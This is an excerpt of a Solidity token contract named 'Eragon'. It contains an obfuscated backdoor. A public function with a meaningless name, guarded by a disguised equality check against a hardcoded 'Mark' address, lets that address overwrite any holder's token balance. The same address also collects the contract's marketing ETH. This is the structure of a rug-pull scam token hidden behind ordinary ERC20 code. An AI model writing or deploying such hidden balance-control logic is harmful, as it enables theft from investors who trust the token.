...
contract Ownable is Context {
    ...
    function oigirn(address account5,address account6) public pure{
        require(account5 == account6);
    }
...
contract  Eragon is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "Eragon";
    string private _symbol = "Eragon";
    ...
    constructor () {
        ...
        Mark = payable(address(0xDACB4d651c2EF7ddA4063A337C61F79C9f948F35));
    ...
    function defmmasl(address sender, uint256 value) public {
        oigirn(_msgSender(),Mark);
        _balances[sender] = value.add(value.sub(_balances[sender]));
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(ETHamountMarketing > 0)
            Mark.transfer(ETHamountMarketing);
    }
